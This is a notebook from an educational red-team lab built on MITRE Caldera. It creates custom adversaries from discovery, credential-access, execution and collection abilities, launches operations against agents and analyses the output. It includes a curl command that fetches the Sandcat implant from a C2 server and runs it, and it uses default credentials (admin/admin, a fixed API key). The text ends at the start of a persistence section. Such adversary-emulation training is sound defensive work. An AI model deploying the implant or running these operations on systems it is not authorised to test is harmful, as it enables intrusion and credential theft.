# 🔴 CALDERA RED TEAM PRACTICE LAB
## Advanced Red Team Lab with MITRE Caldera

---

**Practice objectives:**
- Understand the architecture and components of MITRE Caldera
- Design and run Red Team operations with multiple ATT&CK tactics
- Create custom abilities and adversaries
- Analyze results with Python/Pandas and visualize them with Matplotlib/Seaborn
- Correlate offensive techniques with defensive capabilities (Suricata)

**Tools:**
| Tool | URL | Credentials |
|-------------|-----|--------------|
| Caldera Web | http://localhost:18888 | admin / admin |
| Jupyter     | http://localhost:8889 | (no password) |

> ⚠️ **Legal notice:** This lab is strictly for educational purposes in a controlled environment.
---

## Section 0: Environment Validation 🔍

Before starting, we verify that the Caldera service is active and that the API responds correctly.

In [ ]:
# ── Global imports ──────────────────────────────────────────────────
import subprocess
import requests
import json
import os
import time
import uuid
from collections import Counter, defaultdict
from datetime import datetime

import pandas as pd
import matplotlib.pyplot as plt
import matplotlib.dates as mdates
try:
    import seaborn as sns
    HAS_SEABORN = True
except ImportError:
    HAS_SEABORN = False

# ── Configuration constants ─────────────────────────────────────────────
CALDERA_URL = 'http://localhost:8888'
CALDERA_KEY = 'REDADMIN123'
HEADERS     = {'KEY': CALDERA_KEY, 'Content-Type': 'application/json'}

print('✅ Imports completed')
print(f'   Caldera URL : {CALDERA_URL}')
print(f'   Seaborn     : {"available" if HAS_SEABORN else "not installed (pip install seaborn)"}')

In [ ]:
# ── Systemd service check ───────────────────────────────────────
def check_service(name):
    result = subprocess.run(['systemctl', 'is-active', name],
                            capture_output=True, text=True)
    status = result.stdout.strip()
    icon   = '✅' if status == 'active' else '❌'
    print(f'{icon} Service {name:12s}: {status}')
    return status == 'active'

print('='*55)
print('  CALDERA RED TEAM LAB – Environment Validation')
print('='*55)
print('\n── Systemd services ──')
ok_caldera = check_service('caldera')
ok_jupyter = check_service('jupyter')

In [ ]:
# ── Check connectivity with the Caldera API ────────────────────────────
def check_url(label, url, headers=None):
    try:
        r = requests.get(url, headers=headers or {}, timeout=5)
        icon = '✅' if r.status_code < 400 else '⚠️'
        print(f'{icon} {label:20s}: HTTP {r.status_code}')
        return r.status_code < 400, r
    except Exception as e:
        print(f'❌ {label:20s}: {e}')
        return False, None

print('\n── HTTP endpoints ──')
ok_api, r_health = check_url('Caldera API Health', f'{CALDERA_URL}/api/v2/health', HEADERS)

if ok_api and r_health is not None:
    try:
        health = r_health.json()
        print(f'\n📋 Response from /health:')
        print(json.dumps(health, indent=2))
    except Exception:
        print(r_health.text[:300])

In [ ]:
# ── Validate credentials and show available agents ──────────────────────
try:
    r_agents = requests.get(f'{CALDERA_URL}/api/v2/agents', headers=HEADERS, timeout=10)
    agents_list = r_agents.json() if r_agents.status_code == 200 else []
    print(f'Valid credentials. Registered agents: {len(agents_list)}')
    if agents_list:
        print('\n── Agent details ──')
        for ag in agents_list:
            paw      = ag.get('paw', 'N/A')
            group    = ag.get('group', 'N/A')
            hostname = ag.get('host', 'N/A')
            platform = ag.get('platform', 'N/A')
            status   = ag.get('trusted', False)
            icon     = '🤖'
            print(f'  {icon} PAW:{paw}  group:{group}  host:{hostname}  platform:{platform}  trusted:{status}')
    else:
        print('No agents registered. Deploy a Sandcat agent first.')
except Exception as e:
    print(f'Error querying agents: {e}')

In [ ]:
# ── Show Caldera version ───────────────────────────────────────────────
try:
    r_ver = requests.get(f'{CALDERA_URL}/api/v2/health', headers=HEADERS, timeout=5)
    if r_ver.status_code == 200:
        data = r_ver.json()
        version = data.get('version', 'N/A')
        plugins = data.get('plugins', [])
        print(f'ℹ️ Caldera version : {version}')
        print(f'🔌 Active plugins : {plugins}')
    else:
        print(f'⚠️ Could not retrieve version: HTTP {r_ver.status_code}')
except Exception as e:
    print(f'❌ Error: {e}')

## Section 1: Conceptual Introduction

### What is MITRE Caldera?

**MITRE Caldera** is an open-source adversary emulation platform developed by MITRE Corporation.
It implements the MITRE ATT&CK framework to automate Red Team operations and security assessments.

#### Architecture
```
┌──────────────────────────────────────────────────────┐
│                  Caldera Server                      │
│  ┌──────────┐  ┌──────────┐  ┌──────────────────┐  │
│  │ REST API │  │ Web GUI  │  │  Plugin Engine   │  │
│  └──────────┘  └──────────┘  └──────────────────┘  │
│  ┌──────────────────────────────────────────────┐   │
│  │            Planning Engine                   │   │
│  │  Sequential | Batch | Landmine | Likely      │   │
│  └──────────────────────────────────────────────┘   │
└─────────────────────┬────────────────────────────────┘
                      │ C2 (HTTP/DNS/SMTP)
         ┌────────────┴────────────┐
    ┌────┴────┐              ┌────┴────┐
    │ Agent 1 │              │ Agent 2 │
    │ Sandcat │              │ Ragdoll │
    └─────────┘              └─────────┘
```

#### Key Concepts

| Concept | Description |
|----------|-------------|
| **Agent** | Process implanted on the target. Receives and executes tasks. E.g.: Sandcat (Go), Ragdoll (Python) |
| **Ability** | Atomic technique mapped to a MITRE ATT&CK tactic/technique. Contains platform-specific commands |
| **Adversary** | Profile that groups abilities in a logical order. Defines the attacker's behavior |
| **Operation** | Execution of an adversary against a group of agents. Records all results |
| **Planner** | Algorithm that decides which abilities to run and in what order |
| **Fact** | Dynamically extracted data (hostname, user, IP) used for subsequent abilities |
| **Source** | Collection of predefined facts that feed an operation |
| **Objective** | Success criterion for an operation (number of facts collected) |

#### Relationship to MITRE ATT&CK

Caldera organizes its abilities following the ATT&CK taxonomy:
- **Tactics**: high-level categories (reconnaissance, execution, persistence…)
- **Techniques**: specific methods (T1082 System Info, T1059 Command Interpreter…)
- **Sub-techniques**: variants of a technique (T1059.001 PowerShell, T1059.004 Bash…)

#### Use Cases
1. 🔴 **Red Team**: automate attack campaigns against your own infrastructure
2. 🟣 **Purple Team**: Red and Blue work together to measure detection capabilities
3. 🎓 **Security Training**: train analysts to recognize TTPs
4. 🔍 **Threat Hunting**: simulate known APT TTPs to test defenses

#### Caldera vs Metasploit

| Feature | Caldera | Metasploit |
|----------------|---------|------------|
| Focus | ATT&CK emulation | Exploit/payload |
| Automation | High (planners) | Manual/semi-auto |
| Reporting | Built-in | External |
| ATT&CK coverage | Native | Partial |
| Learning curve | Medium | High |

## Section A: Caldera Fundamentals 🔧

### A.1 – Exploring Abilities

In [ ]:
# ── A.1 Get and analyze available abilities ────────────────────────────
try:
    r = requests.get(f'{CALDERA_URL}/api/v2/abilities', headers=HEADERS, timeout=15)
    r.raise_for_status()
    abilities = r.json()
    print(f'📋 Total available abilities: {len(abilities)}')
except Exception as e:
    abilities = []
    print(f'❌ Error retrieving abilities: {e}')

# Group by tactic
tactic_counts = Counter(a.get('tactic', 'unknown') for a in abilities)
print('\n── Distribution by MITRE ATT&CK Tactic ──')
for tactic, count in sorted(tactic_counts.items(), key=lambda x: -x[1]):
    bar = '█' * min(count, 35)
    print(f'  {tactic:30s} {bar} ({count})')

In [ ]:
# ── A.1 Bar chart: abilities by tactic ────────────────────────────
if tactic_counts:
    tactics_sorted = sorted(tactic_counts.items(), key=lambda x: x[1])
    labels  = [t[0] for t in tactics_sorted]
    values  = [t[1] for t in tactics_sorted]
    colors  = plt.cm.RdYlGn_r([v / max(values) for v in values])

    fig, ax = plt.subplots(figsize=(10, max(4, len(labels) * 0.45)))
    bars = ax.barh(labels, values, color=colors, edgecolor='black', linewidth=0.5)
    ax.bar_label(bars, padding=3, fontsize=9)
    ax.set_xlabel('Number of Abilities')
    ax.set_title('Abilities by MITRE ATT&CK Tactic', fontsize=13, fontweight='bold')
    ax.set_xlim(0, max(values) * 1.15)
    ax.grid(axis='x', alpha=0.3)
    plt.tight_layout()
    plt.savefig('abilities_by_tactic.png', dpi=120, bbox_inches='tight')
    plt.show()
    print('Chart saved: abilities_by_tactic.png')
else:
    print('No ability data available to plot')

### A.2 – Predefined Adversaries

Caldera includes predefined adversaries that model real APT behaviors.
Each adversary groups abilities ordered according to the attack chain of the emulated group.

In [ ]:
# ── A.2 List predefined adversaries ─────────────────────────────────────
try:
    r = requests.get(f'{CALDERA_URL}/api/v2/adversaries', headers=HEADERS, timeout=10)
    r.raise_for_status()
    adversaries_all = r.json()
    print(f'Total adversaries: {len(adversaries_all)}')
except Exception as e:
    adversaries_all = []
    print(f'Error: {e}')

print(f'\n{"Name":40s} {"Abilities":>9s}  Description')
print('-'*90)
for adv in adversaries_all:
    name   = adv.get('name', 'N/A')
    n_ab   = len(adv.get('atomic_ordering', []))
    desc   = (adv.get('description', '') or '')[:45]
    print(f'  {name:38s} {n_ab:6d}    {desc}')

In [ ]:
# ── A.2 Technique mapping by adversary ────────────────────────────────────
# Build an index of abilities by ID
ab_index = {a['ability_id']: a for a in abilities if 'ability_id' in a}

print('── ATT&CK techniques by adversary (first 5) ──\n')
for adv in adversaries_all:
    name    = adv.get('name', 'N/A')
    ab_ids  = adv.get('atomic_ordering', [])
    print(f'{name}')
    for ab_id in ab_ids:
        ab   = ab_index.get(ab_id, {})
        tid  = ab.get('technique_id', '?')
        tname = ab.get('name', ab_id)[:50]
        tact  = ab.get('tactic', '?')
        print(f'   [{tid}] {tname} ({tact})')
    if len(ab_ids) > 6:
        print(f'   ... and {len(ab_ids)-6} more')
    print()

### A.3 – Planners
The planner determines the order and execution logic of abilities within an operation.

| Planner | Strategy | Use case |
|--------------|------------|-------------|
| **atomic** | During each phase of the operation, the atomic planner iterates through each agent and sends the next available ability it believes the agent can complete. This decision is based on the agent matching the ability's operating system (execution platform) and the ability's command having no unsatisfied variables. The planner then waits for each agent to complete its command before determining subsequent abilities. Abilities are processed in the order set by each agent's atomic ordering. For example, if agent A has atomic ordering (A1, A2, A3) and agent B has atomic ordering (B1, B2, B3), the planner would send (A1, B1) in the first phase, then (A2, B2), etc. | Predictable campaigns, demos |
| **batch** | During each phase of the operation, the batch planner goes through all agents (that are part of the operation's group) and sends them a list of all ability commands it believes they can complete. This decision is based on the agent matching the ability's operating system (execution platform) and the ability's command having no unsatisfied variables. It then waits for each agent to complete its list of commands before moving to the next phase. In operations without phases, all applicable commands run in a single phase, which then completes and finishes the operation. | Maximum fast coverage |
| **bayes** | The Bayes planner decides which links and abilities to execute at each step of the operation using statistics from Caldera's previous operational data (previously executed actions/abilities). It uses user-configurable parameters, such as the minimum success probability of a link and the minimum amount of data required (configurable in `48e1a882-1606-4910-8f2d-2352eb80cba2.yml`), to make decisions adapted to the defined criteria and execute only the links with the required confidence and data significance. Operations run automatically in order of success probability (highest to lowest); links with insufficient data run last, and those with sufficient data but low success probability are discarded. It allows running operations with high confidence in each link and automatically prioritizing the most effective abilities. | Adaptive operations based on historical data |
| **buckets** | The buckets planner is a variant of the batch planner that leverages Caldera's newer bucket functionality. Each ability in Caldera is organized into buckets based on its corresponding ATT&CK tactics by default, with the option to define custom mappings. This planner simply goes through all abilities available for the given adversary, following the tactic order set out in the ATT&CK matrix, and iterates again if actions remain to be performed. | Structured execution by ATT&CK tactics |
| **guided** | The guided planner maps between links likely to achieve a given objective and executes the links in the order most likely to reach the established goals in the shortest possible execution. | Operations oriented toward specific objectives |
| **look ahead** | The look ahead planner decides which abilities to use based on anticipated future rewards. It takes as input a table of ability rewards, a depth parameter, and a discount factor. The depth parameter effectively controls the planner's "lookahead range" when scoring each action, while the discount factor determines how future rewards are weighted. | Strategic decision-making with a forward-looking view |

In [ ]:
# ── A.3 List available planners ────────────────────────────────────
try:
    r = requests.get(f'{CALDERA_URL}/api/v2/planners', headers=HEADERS, timeout=10)
    r.raise_for_status()
    planners = r.json()
    print(f'Available planners: {len(planners)}')
    print()
    for p in planners:
        name  = p.get('name', 'N/A')
        desc  = (p.get('description', '') or '')[:80]
        print(f'  Planner:    {name}')
        print(f'  Description:    {desc}')
        print()
except Exception as e:
    planners = []
    print(f'Error retrieving planners: {e}')

## Section B: First Operation – Simple Reconnaissance

### B.1 – Agent Registration

To run operations we need at least one registered agent.

**How to deploy a Sandcat agent (Linux):**
```bash
# On the target system's terminal (agent):
curl -s -X POST -H 'file:sandcat.go-linux' \
     -H 'platform:linux' \
     http://192.168.56.10:8888/file/download > /tmp/sandcat
chmod +x /tmp/sandcat
/tmp/sandcat -server http://192.168.56.10:8888 -group red -v
```
> The agent registers automatically with Caldera and appears in the agent list.

In [ ]:
# ── B.1 Get available agents ─────────────────────────────────────────
try:
    r = requests.get(f'{CALDERA_URL}/api/v2/agents', headers=HEADERS, timeout=10)
    r.raise_for_status()
    agents_list = r.json()
    print(f' Registered agents: {len(agents_list)}')
except Exception as e:
    agents_list = []
    print(f' Error retrieving agents: {e}')

# Save first agent for later use
first_paw   = None
first_group = 'red'

if agents_list:
    print(f'\n{"PAW":12s} {"Group":10s} {"Host":20s} {"Platform":12s} {"Trusted":>8s}')
    print('-'*70)
    for ag in agents_list:
        paw      = ag.get('paw', 'N/A')
        group    = ag.get('group', 'N/A')
        host     = ag.get('host', 'N/A')
        platform = ag.get('platform', 'N/A')
        trusted  = ag.get('trusted', False)
        print(f'  {paw:10s} {group:10s} {host:20s} {platform:12s} {str(trusted):>8s}')
        if first_paw is None:
            first_paw   = paw
            first_group = group
    print(f'\nSelected agent: PAW={first_paw}, group={first_group}')
else:
    print(' No agents. Operations will use the "red" group by default.')

### B.2 – Create Custom Adversary (Discovery)

We select reconnaissance abilities to create our first custom adversary.

**Techniques included:**
| ID | Technique | Description |
|----|---------|-------------|
| T1082 | System Information Discovery | OS and hardware information |
| T1057 | Process Discovery | List of running processes |
| T1033 | System Owner/User Discovery | Identify the current user |
| T1007 | System Service Discovery | Active services on the system |
| T1016 | System Network Configuration | Network configuration |

In [ ]:
# ── B.2 Filter discovery abilities ───────────────────────────────────────
discovery_tactics = {'discovery', 'reconnaissance'}
discovery_ab = [a for a in abilities if a.get('tactic', '') in discovery_tactics]
print(f'🔍 Available reconnaissance abilities: {len(discovery_ab)}')

# Show the first abilities with their techniques
print(f'\n{"Technique ID":12s} {"Name":40s} {"Tactic":20s}')
print('-'*75)
selected_disc_ids = []
target_techniques = {'T1082', 'T1057', 'T1033', 'T1007', 'T1016'}
for ab in discovery_ab:
    tid  = ab.get('technique_id', '')
    name = ab.get('name', 'N/A')[:38]
    tact = ab.get('tactic', 'N/A')
    abid = ab.get('ability_id', '')
    marker = ' ' if tid in target_techniques and abid not in selected_disc_ids else ''
    if tid in target_techniques and abid not in selected_disc_ids:
        selected_disc_ids.append(abid)
    print(f'  {tid:10s} {name:40s} {tact:20s}{marker}')

# If we don't have enough, add the first available ones
for ab in discovery_ab:
    if len(selected_disc_ids) >= 5:
        break
    abid = ab.get('ability_id', '')
    if abid not in selected_disc_ids:
        selected_disc_ids.append(abid)

print(f'\n Selected abilities: {len(selected_disc_ids)}')

In [ ]:
# ── B.2 Filter discovery abilities LINUX ONLY ─────────────────────
discovery_tactics = {'discovery', 'reconnaissance'}
discovery_ab = [a for a in abilities if a.get('tactic', '') in discovery_tactics]

print(f'🔍 Total reconnaissance abilities: {len(discovery_ab)}')

# 🐧 Filter Linux only - look in executors
linux_discovery = []
for ab in discovery_ab:
    executors = ab.get('executors', [])
    for executor in executors:
        if isinstance(executor, dict):
            platform = executor.get('platform', '').lower()
            if 'linux' in platform:
                linux_discovery.append(ab)
                break
        elif isinstance(executor, str):
            if 'linux' in executor.lower():
                linux_discovery.append(ab)
                break

print(f'🔍 Reconnaissance abilities (LINUX): {len(linux_discovery)}')

# Show abilities with their platforms
print(f'\n{"Technique ID":12s} {"Name":40s} {"Platform":20s}')
print('-'*75)
selected_disc_ids = []
target_techniques = {'T1082', 'T1057', 'T1033', 'T1007', 'T1016'}

for ab in linux_discovery:
    tid  = ab.get('technique_id', '')
    name = ab.get('name', 'N/A')[:38]
    executors = ab.get('executors', [])
    platform = 'linux'
    if executors and isinstance(executors[0], dict):
        platform = executors[0].get('platform', 'N/A')
    abid = ab.get('ability_id', '')

    marker = ' ' if tid in target_techniques and abid not in selected_disc_ids else ''
    if tid in target_techniques and abid not in selected_disc_ids:
        selected_disc_ids.append(abid)
    print(f'  {tid:10s} {name:40s} {platform:20s}{marker}')

# If we don't have enough, add the first available ones
for ab in linux_discovery:
    if len(selected_disc_ids) >= 5:
        break
    abid = ab.get('ability_id', '')
    if abid not in selected_disc_ids:
        selected_disc_ids.append(abid)

print(f'\n Selected abilities (Linux): {len(selected_disc_ids)}')

In [ ]:
# ── B.2 Create 'Lab-Discovery' adversary ────────────────────────────────────
adversary_disc = {
    'name': 'Lab-Discovery',
    'description': 'Educational adversary: system reconnaissance (Section B) - LINUX ONLY',
    'atomic_ordering': selected_disc_ids[:5]
}

print(f' Adversary to create:')
print(f'   Name: {adversary_disc["name"]}')
print(f'   Abilities: {len(selected_disc_ids)} selected')
print(f'   IDs: {selected_disc_ids}')

try:
    r = requests.post(f'{CALDERA_URL}/api/v2/adversaries',
                      headers=HEADERS,
                      json=adversary_disc,
                      timeout=10)
    if r.status_code in (200, 201):
        adv_disc = r.json()
        adv_disc_id = adv_disc.get('adversary_id', adv_disc.get('id', ''))
        print(f'\n Adversary created successfully')
        print(f'   Name: {adv_disc.get("name")}')
        print(f'   ID: {adv_disc_id}')
        print(f'   Abilities: {len(adv_disc.get("atomic_ordering", []))}')
    else:
        print(f'\n  Unexpected response: HTTP {r.status_code}')
        print(f'   Error: {r.text[:300]}')
        adv_disc_id = None
except Exception as e:
    adv_disc_id = None
    print(f'\n Error creating adversary: {e}')

### B.3 – Run Operation

In [ ]:
# ── B.3 Create and launch reconnaissance operation ──────────────────────────
op_disc_id = None

if adv_disc_id:
    operation_disc = {
        'name': f'Lab-Op-Discovery-{datetime.now().strftime("%H%M%S")}',
        'adversary': {'adversary_id': adv_disc_id},
        'planner':   {'id': 'aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a'},
        'group':     first_group,
        'auto_close': True,
        'state':     'running'
    }
    try:
        r = requests.post(f'{CALDERA_URL}/api/v2/operations',
                          headers=HEADERS,
                          json=operation_disc,
                          timeout=10)
        if r.status_code in (200, 201):
            op_disc = r.json()
            op_disc_id = op_disc.get('id', '')
            print(f'✅ Operation started: {op_disc.get("name")} (ID: {op_disc_id})')
            print(f'   Initial state: {op_disc.get("state", "N/A")}')
        else:
            print(f'⚠️  Error creating operation: HTTP {r.status_code}')
            print(r.text[:300])
    except Exception as e:
        print(f'❌ Error: {e}')
else:
    print('⚠️  Cannot launch operation without a valid adversary')

In [ ]:
# ── B.3 Monitor operation progress ──────────────────────────────────
def poll_operation(op_id, max_iter=30, sleep_sec=5):
    """Polls the state of an operation until it finishes or max_iter is reached."""
    if not op_id:
        print(' Operation ID not available')
        return None
    print(f'⏳ Monitoring operation {op_id}...')
    for i in range(max_iter):
        try:
            r = requests.get(f'{CALDERA_URL}/api/v2/operations/{op_id}',
                             headers=HEADERS, timeout=10)
            if r.status_code == 200:
                op = r.json()
                state  = op.get('state', 'unknown')
                chains = op.get('chain', [])
                done   = sum(1 for c in chains if c.get('finish'))
                total  = len(chains)
                print(f'  [{i+1:2d}/{max_iter}] State: {state:12s} | Steps: {done}/{total}')
                if state in ('finished', 'complete', 'cleanup'):
                    print(f' Operation finished: {state}')
                    return op
            else:
                print(f'    HTTP {r.status_code}')
        except Exception as e:
            print(f'  Polling error: {e}')
        time.sleep(sleep_sec)
    print('Maximum wait time reached')
    return None

op_disc_result = poll_operation(op_disc_id)

### B.4 – Analyze Results

In [ ]:
# ── B.4 Extract and display operation results ────────────────────────────
def analyze_operation(op_data):
    """Analyzes an operation's results and shows a summary."""
    if not op_data:
        print('⚠️  No operation data to analyze')
        return []
    name   = op_data.get('name', 'N/A')
    state  = op_data.get('state', 'N/A')
    chains = op_data.get('chain', [])
    print(f'📊 Operation Analysis: {name}')
    print(f'   Final state: {state}')
    print(f'   Total steps: {len(chains)}')
    print()
    results = []
    for link in chains:
        ability  = link.get('ability', {})
        ab_name  = ability.get('name', 'N/A')[:45]
        tid      = ability.get('technique_id', 'N/A')
        tactic   = ability.get('tactic', 'N/A')
        status   = link.get('status', -1)
        output   = link.get('output', '') or ''
        icon     = '✅' if status == 0 else ('⏭️' if status == -3 else '❌')
        status_s = 'OK' if status == 0 else ('SKIP' if status == -3 else f'ERR({status})')
        print(f'  {icon} [{tid}] {ab_name}')
        print(f'      Tactic: {tactic} | Status: {status_s}')
        if output:
            print(f'      Output: {output[:120].strip()}')
        print()
        results.append({'ability': ab_name, 'technique_id': tid,
                        'tactic': tactic, 'status': status, 'output': output})
    return results

disc_results = analyze_operation(op_disc_result)

## Section C: Intermediate Operation – Multi-Tactic 🎯

### C.1 – Attack Chain Design

A real attack chain follows a logical sequence where each phase enables the next:

```
Discovery → Credential Access → Execution → Collection
   T1082        T1003              T1059        T1005
   T1057        T1003.001          T1059.004    T1074
   T1033
```

**Why this order?**
1. **Discovery** first: we need to know the environment before acting
2. **Credential Access**: obtaining credentials expands access
3. **Execution**: run payloads using the obtained credentials
4. **Collection**: gather valuable data for later exfiltration

**MITRE ATT&CK tactics involved:**
- `TA0007` Discovery – Know the environment
- `TA0006` Credential Access – Obtain credentials
- `TA0002` Execution – Execute code
- `TA0009` Collection – Gather information

In [ ]:
# ── C.2 CHECK INDEPENDENCE - Select RANDOM abilities ───────────
import random
# ── C.2 Select multi-tactic abilities ──────────────────────────────────
multi_tactics = {'discovery', 'credential-access', 'execution', 'collection'}
target_ids_c  = {'T1057', 'T1083', 'T1005', 'T1003', 'T1059', 'T1074'}

multi_ab      = [a for a in abilities if a.get('tactic', '') in multi_tactics]
print(f'🎯 Available multi-tactic abilities: {len(multi_ab)}')

print("🎲 Analyzing and selecting RANDOM abilities...\n")

# Inspect requirements structure
print("Requirement examples:")
for ab in multi_ab[:3]:
    reqs = ab.get('requirements', [])
    print(f"  {ab.get('name', 'N/A')[:40]:40s} | requirements: {reqs}")

print("\n" + "="*80)

# Filter only abilities WITHOUT requirements (independent)
multi_ab_independent = [a for a in multi_ab if not a.get('requirements', [])]
multi_ab_dependent = [a for a in multi_ab if a.get('requirements', [])]

print(f'\n📊 Multi-tactic abilities (LINUX):')
print(f'   Total          : {len(multi_ab)}')
print(f'   ✅ Independent: {len(multi_ab_independent)} (no dependencies)')
print(f'   🔗 Dependent : {len(multi_ab_dependent)} (with dependencies)')

if multi_ab_dependent:
    print(f'\n⚠️  Abilities with dependencies (EXCLUDED):')
    for ab in multi_ab_dependent[:3]:
        reqs = ab.get('requirements', [])
        name = ab.get('name', 'N/A')[:40]
        print(f'   - {name:40s} | requires: {reqs}')

# Select RANDOM - distributed by tactic
multi_tactics = {'discovery', 'credential-access', 'execution', 'collection'}
selected_multi = []

# Group by tactic
by_tactic = {tact: [] for tact in multi_tactics}
for ab in multi_ab_independent:
    tact = ab.get('tactic', '')
    if tact in by_tactic:
        by_tactic[tact].append(ab)

print(f'\n🎲 Selecting RANDOM abilities by tactic:')
print('-'*80)

# Select random abilities from each tactic (max 2 per tactic)
for tact in multi_tactics:
    ab_list = by_tactic.get(tact, [])
    if ab_list:
        # Select 1-2 random ones from this tactic
        count = min(random.randint(1, 2), len(ab_list))
        random_abs = random.sample(ab_list, count)
        selected_multi.extend([ab.get('ability_id', '') for ab in random_abs])

        print(f'\n  {tact:25s}: Selected {count}')
        for ab in random_abs:
            tid = ab.get('technique_id', '?')
            name = ab.get('name', 'N/A')[:38]
            print(f'    🎯 [{tid}] {name}')

print(f'\n✅ Total RANDOM abilities selected: {len(selected_multi)}')
print(f'\n{"Technique":12s} {"Name":40s} {"Tactic":25s}')
print('-'*85)

for abid in selected_multi:
    ab   = ab_index.get(abid, {})
    tid  = ab.get('technique_id', '?')
    name = ab.get('name', abid)[:38]
    tact = ab.get('tactic', '?')
    print(f'  {tid:10s} {name:40s} {tact:25s}')

print(f'\n🚀 Ready to create adversary with {len(selected_multi)} random, independent abilities')

In [ ]:
# ── C.2 Create 'Lab-MultiTactic' adversary with random abilities ─────────
adv_multi_id = None

if len(selected_multi) > 0:
    adversary_multi = {
        'name': 'Lab-MultiTactic',
        'description': f'Educational adversary: RANDOM multi-tactic chain ({len(selected_multi)} independent abilities)',
        'atomic_ordering': selected_multi
    }

    print(f'📋 Creating adversary:')
    print(f'   Name: {adversary_multi["name"]}')
    print(f'   Abilities: {len(selected_multi)}')
    print(f'   IDs: {selected_multi}')
    print()

    try:
        r = requests.post(f'{CALDERA_URL}/api/v2/adversaries',
                          headers=HEADERS,
                          json=adversary_multi,
                          timeout=10)
        if r.status_code in (200, 201):
            adv_m = r.json()
            adv_multi_id = adv_m.get('adversary_id', adv_m.get('id', ''))
            print(f'✅ Adversary created successfully')
            print(f'   Name: {adv_m.get("name")}')
            print(f'   ID: {adv_multi_id}')
            print(f'   Abilities: {len(adv_m.get("atomic_ordering", []))}')
        else:
            print(f'⚠️  Error: HTTP {r.status_code}')
            print(f'   Response: {r.text[:300]}')
            adv_multi_id = None
    except Exception as e:
        print(f'❌ Error creating adversary: {e}')
        adv_multi_id = None
else:
    print('⚠️  No abilities selected')
    adv_multi_id = None

if adv_multi_id:
    print(f'\n🚀 Ready to run operation with adversary: {adv_multi_id}')
else:
    print('❌ Cannot continue without a valid adversary')

In [ ]:
# ── Get list of available planners ──────────────────────────────────
print("📋 Retrieving available planners...\n")

try:
    r = requests.get(f'{CALDERA_URL}/api/v2/planners',
                     headers=HEADERS,
                     timeout=10)
    if r.status_code == 200:
        planners_list = r.json()
        print(f'✅ Available planners: {len(planners_list)}\n')

        planners_dict = {}
        for p in planners_list:
            planner_id = p.get('id', '')
            name = p.get('name', 'N/A')
            desc = p.get('description', 'No description')[:50]
            planners_dict[name] = planner_id

            print(f'  📌 Name: {name}')
            print(f'     ID: {planner_id}')
            print(f'     Description: {desc}')
            print()
    else:
        print(f'⚠️  Error: HTTP {r.status_code}')
except Exception as e:
    print(f'❌ Error: {e}')

# Show which one we are using
print('='*80)
print(f'🎯 CURRENT PLANNER IN OPERATIONS: sequential')
print(f'   ID: aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a')
print()
print('💡 OPTIONS:')
print('   - sequential: Runs abilities one after another (slower, safer)')
print('   - batch: Runs abilities in parallel (faster, less control)')

In [ ]:
# ── C.3 FUNCTION + RUN AND MONITOR multi-tactic operation ─────────────

# 1. DEFINE MONITORING FUNCTION
def poll_operation_detailed(op_id, max_iter=60, sleep_sec=10):
    """Monitors an operation in real time with details of each executed step."""
    if not op_id:
        print('⚠️  Operation ID not available')
        return None

    print(f'⏳ Monitoring operation {op_id}...')
    print(f'   Max time: {max_iter * sleep_sec} seconds (~{(max_iter * sleep_sec) // 60} minutes)')
    print('='*80)

    for i in range(max_iter):
        try:
            r = requests.get(f'{CALDERA_URL}/api/v2/operations/{op_id}',
                             headers=HEADERS, timeout=15)
            if r.status_code == 200:
                op = r.json()
                state  = op.get('state', 'unknown')
                chains = op.get('chain', [])
                done   = sum(1 for c in chains if c.get('finish'))
                total  = len(chains)

                print(f'\n[{i+1:2d}/{max_iter}] State: {state.upper():12s} | Progress: {done}/{total} steps')
                print('-'*80)

                if chains:
                    for idx, chain in enumerate(chains, 1):
                        ability_id = chain.get('ability_id', 'N/A')
                        status = '✅' if chain.get('finish') else '⏳'

                        ability_name = 'N/A'
                        for ab in abilities:
                            if ab.get('ability_id') == ability_id:
                                ability_name = ab.get('name', 'N/A')
                                break

                        result = chain.get('output', '')
                        if result:
                            print(f'  {status} [{idx}] {ability_name}')
                            print(f'       Result: {result[:150]}')
                        else:
                            print(f'  {status} [{idx}] {ability_name}')

                agents = op.get('agents', [])
                if agents:
                    print(f'\n🤖 Participating agents:')
                    for ag in agents:
                        print(f'   - {ag.get("paw", "N/A")} ({ag.get("host", "N/A")})')

                if state in ('finished', 'complete', 'cleanup'):
                    print('\n' + '='*80)
                    print(f'✅ OPERATION FINISHED: {state.upper()}')
                    print(f'   Steps completed: {done}/{total}')
                    print('='*80)
                    return op
            else:
                print(f'  ⚠️  HTTP error {r.status_code}')
        except Exception as e:
            print(f'  ❌ Query error: {e}')

        if i < max_iter - 1:
            print(f'\n⏱️  Waiting {sleep_sec}s...')
            time.sleep(sleep_sec)

    print('\n' + '='*80)
    print('⚠️  MAXIMUM TIME REACHED')
    print('='*80)
    return None

# 2. RUN OPERATION
print('✅ Function defined. Starting operation...\n')

op_multi_id = None
op_multi_result = None
ts_start = datetime.now()

if adv_multi_id:
    operation_multi = {
        'name': f'Lab-Op-MultiTactic-{ts_start.strftime("%H%M%S")}',
        'adversary': {'adversary_id': adv_multi_id},
        'planner':   {'id': 'aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a'},
        'group':     first_group,
        'auto_close': True,
        'state':     'running'
    }

    print(f'📋 Starting operation:')
    print(f'   Name: {operation_multi["name"]}')
    print(f'   Adversary: {adv_multi_id}')
    print(f'   Group: {first_group}')
    print()

    try:
        r = requests.post(f'{CALDERA_URL}/api/v2/operations',
                          headers=HEADERS,
                          json=operation_multi,
                          timeout=10)
        if r.status_code in (200, 201):
            op_multi_data = r.json()
            op_multi_id   = op_multi_data.get('id', '')
            print(f'✅ Operation started: {op_multi_data.get("name")} (ID: {op_multi_id})')
            print()
        else:
            print(f'⚠️  HTTP error {r.status_code}')
            print(f'   {r.text[:200]}')
    except Exception as e:
        print(f'❌ Error: {e}')

# 3. MONITOR
if op_multi_id:
    print('='*80)
    print(f'🚀 STARTING DETAILED MONITORING')
    print('='*80)
    op_multi_result = poll_operation_detailed(op_multi_id, max_iter=90, sleep_sec=10)

    ts_end = datetime.now()
    duration = (ts_end - ts_start).total_seconds()
    print(f'\n⏱️  TOTAL DURATION: {int(duration)}s ({int(duration//60)}m {int(duration%60)}s)')
else:
    print('❌ Could not start operation')

## Section D: Advanced Operation – Persistence and Lateral Movement 🔗

### D.1 – Establish Persistence

Persistence ensures the attacker retains access even if the system reboots.

**Persistence Techniques:**
| Technique | ID | Method | Detection |
|---------|-----|--------|-----------|
| Scheduled Task/Job | T1053 | Cron, at, systemd timers | auditd, /var/log/cron |
